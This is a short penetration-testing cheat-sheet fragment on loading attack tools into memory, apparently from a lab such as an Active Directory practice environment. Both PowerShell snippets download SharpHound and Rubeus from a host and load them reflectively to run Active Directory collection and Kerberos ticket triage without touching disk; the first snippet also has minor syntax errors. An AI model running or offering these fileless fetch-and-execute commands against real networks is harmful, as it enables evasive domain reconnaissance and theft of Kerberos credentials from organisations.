

## Load into Memory 

#### Linux



#### PowerShell

```bash
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/SharpHound.exe') 
$assem = [System.Reflection.Assembly]::Load($data) [Sharphound.Program]::Main("-d north.sevenkingdoms.local -c all".Split())`
```

```bash
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/Rubeus.exe') 
$assem = [System.Reflection.Assembly]::Load($data); [Rubeus.Program]::MainString("triage");
```